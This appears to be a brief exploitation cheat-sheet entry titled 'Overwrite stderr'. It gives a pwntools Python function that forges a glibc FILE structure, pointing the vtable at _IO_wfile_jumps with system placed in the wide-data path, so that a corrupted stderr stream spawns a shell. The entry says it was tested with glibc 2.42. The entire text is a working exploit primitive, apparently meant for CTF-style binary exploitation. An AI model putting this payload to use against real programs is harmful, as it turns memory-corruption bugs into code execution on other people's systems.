
### Overwrite `stderr`
+ Tested with glibc 2.42

```python
def fsrop(fp=libc.sym._IO_2_1_stderr_, offset=0):
  fs = FileStructure()
  fs.flags = u64(b' sh\0\0\0\0\0')
  fs._IO_write_ptr = 1 # need to be greater than _IO_write_base
  fs._lock = libc.address + 0x213780
  fs._wide_data = fp - 0x10
  fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(fp + 0x60)
  fs.vtable = libc.sym._IO_wfile_jumps + offset
  return bytes(fs)
```